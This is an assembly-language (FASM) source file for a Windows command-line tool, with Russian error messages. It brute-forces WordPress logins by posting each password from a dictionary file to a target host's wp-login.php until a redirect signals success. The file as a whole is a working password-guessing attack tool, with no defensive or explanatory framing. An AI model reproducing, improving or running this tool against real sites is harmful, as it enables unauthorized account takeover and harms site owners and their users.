format pe gui 4.0
include '%fasm_inc%\win32ax.inc'
include 'regexp\ctypedef.inc'
include 'regexp\AsmRegEx.inc'

IPPROTO_TCP = 0
INVALID_SOCKET = -1

.data
include 'regexp\AsmRegEr.inc'
include 'regexp\ctypemap.inc'

qry db 'POST /wp-login.php HTTP/1.1',13,10,\
       'Content-Type: application/x-www-form-urlencoded',13,10,\
       'Content-Length: %u',13,10,\
       'Host: %s',13,10,13,10
post db 'redirect_to="http://%s/wp-admin/"&pwd=%s&log=%s&wp-submit=Login',0
size_post = $-post-1-3*2
err1 db 'Необходимо запускать с командами -h,-l,-d!',0
err2 db 'Ошибка при открытии словаря!',0
err3 db 'Не удовлетворяет размер словаря!',0
err4 db 'Ошибка при выделении памяти!',0
err5 db 'Ошибка при чтении словаря!',0
err6 db 'Слишком большой словарь!',0
host dd 0
login dd 0
dic dd 0
pattern1  db 'Location:',0
wsa WSADATA
ip dd ?
regex REGEX_T

argc dd ?
argv dd ?
env dd ?
sinfo STARTUPINFO

arrbuff dd ?
dicbuff dd ?
hDic dd ?
arrbuff_size dd ?
lastpass dd ?
count dd ?
WordCount dd ?
pcent dd ?
stop db 0
progress dd ?

buff rb 2048

.code
start:
	cinvoke __getmainargs,argc,argv,env,0,sinfo
	.if [argc]=7
		mov eax,[argv]
		mov ecx,[eax+4]
		.if word [ecx]='-h'
			mov ecx,[eax+8]
			mov [host],ecx
		.elseif word [ecx]='-l'
			mov ecx,[eax+8]
			mov [login],ecx
		.elseif word [ecx]='-d'
			mov ecx,[eax+8]
			mov [dic],ecx
		.endif
		mov ecx,[eax+12]
		.if word [ecx]='-s'
			mov ecx,[eax+16]
			mov [host],ecx
		.elseif word [ecx]='-l'
			mov ecx,[eax+16]
			mov [login],ecx
		.elseif word [ecx]='-d'
			mov ecx,[eax+16]
			mov [dic],ecx
		.endif
		mov ecx,[eax+20]
		.if word [ecx]='-s'
			mov ecx,[eax+24]
			mov [host],ecx
		.elseif word [ecx]='-l'
			mov ecx,[eax+24]
			mov [login],ecx
		.elseif word [ecx]='-d'
			mov ecx,[eax+24]
			mov [dic],ecx
		.endif
		.if [host]=0 | [dic]=0 | [login]=0
			invoke MessageBoxA,0,err1,0,MB_ICONERROR+MB_OK
			jmp .exit
		.endif
	.else
		invoke MessageBoxA,0,err1,0,MB_ICONERROR+MB_OK
		jmp .exit
	.endif
	invoke WSAStartup,101h,wsa
	test eax,eax
	jne .exit
	invoke gethostbyname,[host]
	test eax,eax
	je .exit
	mov eax,[eax+hostent.h_addr_list]
	mov eax,[eax]
	mov eax,[eax]
	mov [ip],eax
	stdcall regcomp,regex,pattern1
	invoke _lopen,[dic],OF_READ
	.if eax=-1
		invoke MessageBoxA,0,err2,[host],MB_ICONERROR+MB_OK
		jmp .exit1
	.endif
	mov [hDic],eax
	invoke GetFileSize,eax,0
	.if eax=0  | eax>=4*1024*1024*1024-1
		invoke MessageBoxA,0,err3,[host],MB_ICONERROR+MB_OK
		jmp .exit2
	.endif
	mov esi,eax
	inc eax
	invoke GlobalAlloc,GPTR,eax
	.if eax=0
		invoke MessageBoxA,0,err4,[host],MB_ICONERROR+MB_OK
		jmp .exit2
	.endif
	mov [dicbuff],eax
	invoke GlobalAlloc,GPTR,5000000
	.if eax=0
		invoke MessageBoxA,0,err4,[host],MB_ICONERROR+MB_OK
		jmp .exit3
	.endif
	mov [arrbuff_size],5000000/4
	mov [arrbuff],eax
	invoke _lread,[hDic],[dicbuff],esi
	.if eax=-1
		invoke MessageBoxA,0,err5,[host],MB_ICONERROR+MB_OK
		jmp .exit4
	.endif
	stdcall analysdic
	cmp [stop],1
	je .exit4

	mov [count],0
	@@:
	mov eax,[count]
	mov ecx,[arrbuff]
	mov eax,[eax*4+ecx]
	mov [lastpass],eax
	stdcall brute,eax
	.if eax<>0
		 invoke MessageBoxA,0,[lastpass],'Okay',0
		 jmp .exit4
	.endif
	dec [WordCount]
	inc [count]
	cmp [WordCount],0
	jne @b
	invoke MessageBoxA,0,'=(',0,0
    .exit4:
	invoke GlobalFree,[arrbuff]
    .exit3:
	invoke GlobalFree,[dicbuff]
    .exit2:
	invoke CloseHandle,[hDic]
    .exit1:
	invoke WSACleanup
     .exit:
	invoke ExitProcess,0

proc brute psw
	local hSock:DWORD
	local sin:sockaddr_in

	mov eax,[ip]
	mov [sin.sin_addr],eax
	invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
	cmp eax,INVALID_SOCKET
	je .exit
	mov [hSock],eax
	mov [sin.sin_family],AF_INET
	invoke htons,80
	mov [sin.sin_port],ax
	lea eax,[sin]
	invoke connect,[hSock],eax,sizeof.sockaddr_in
	invoke lstrlenA,[psw]
	mov esi,eax
	invoke lstrlenA,[login]
	add esi,eax
	invoke lstrlenA,[host]
	add esi,eax
	add esi,size_post
	cinvoke wsprintfA,buff,qry,esi,[host],[host],[psw],[login]
	invoke send,[hSock],buff,eax,0
	invoke recv,[hSock],buff,2048,0
	mov esi,eax
	invoke closesocket,[hSock]
	.if esi>0
		stdcall regexec,regex,buff
		.if eax<>REGEX_NOMATCH
			xor eax,eax
			inc eax
		.endif
	.else
		xor eax,eax
	.endif
	ret
      .exit:
	xor eax,eax
	ret
endp

proc analysdic
	mov eax,esi
	mov ecx,100
	xor edx,edx
	div ecx
	mov [pcent],eax
	xor ecx,ecx
	mov edi,[arrbuff]
	mov ebx,[dicbuff]
       .m1:
	.if byte [ebx]<>0 & word [ebx]<>0A0Dh & byte [ebx]<>0Ah
		mov eax,[WordCount]
		lea eax,[eax*4]
		mov [edi+eax],ebx
		inc [WordCount]
		inc ecx
		inc ebx
	.endif
       .m2:
	mov edx,[arrbuff_size]
	.if byte [ebx]=0
		jmp .m3
	.elseif [WordCount]=edx
		.if edx=10000000
			invoke MessageBoxA,0,err6,[host],MB_ICONERROR+MB_OK
			mov [stop],1
		.else
			pusha
			add [arrbuff_size],5000000/4
			mov eax,[arrbuff_size]
			shl eax,2
			push edx
			invoke GlobalAlloc,GPTR,eax
			pop edx
			.if eax=0
				mov [stop],1
				jmp .m3
			.endif
			mov ecx,[arrbuff]
			mov [lastpass],ecx
			mov [arrbuff],eax
			stdcall memcpy,eax,ecx,edx
			invoke GlobalFree,[lastpass]
			popa
			mov edi,[arrbuff]
			jmp .m2
		.endif
	.elseif word [ebx]=0A0Dh
		mov word [ebx],0
		add ecx,2
		add ebx,2
		xor edx,edx
		mov eax,ecx
		mov esi,[pcent]
		.if esi<>0
			div esi
		.else
			mov eax,0
		.endif
		mov [progress],eax
		jmp .m1
	.elseif byte  [ebx]=0Ah
		mov byte [ebx],0
		inc ecx
		inc ebx
		xor edx,edx
		mov eax,ecx
		mov esi,[pcent]
		.if esi<>0
			div esi
		.else
			mov eax,0
		.endif
		mov [progress],eax
		jmp .m1
	.else
		inc ebx
		inc ecx
		jmp .m2
	.endif
	.m3:
	ret
endp

proc memcpy dst,src,size
	mov esi,[src]
	mov edi,[dst]
	mov ecx,[size]
	rep movsd
	ret
endp

.end start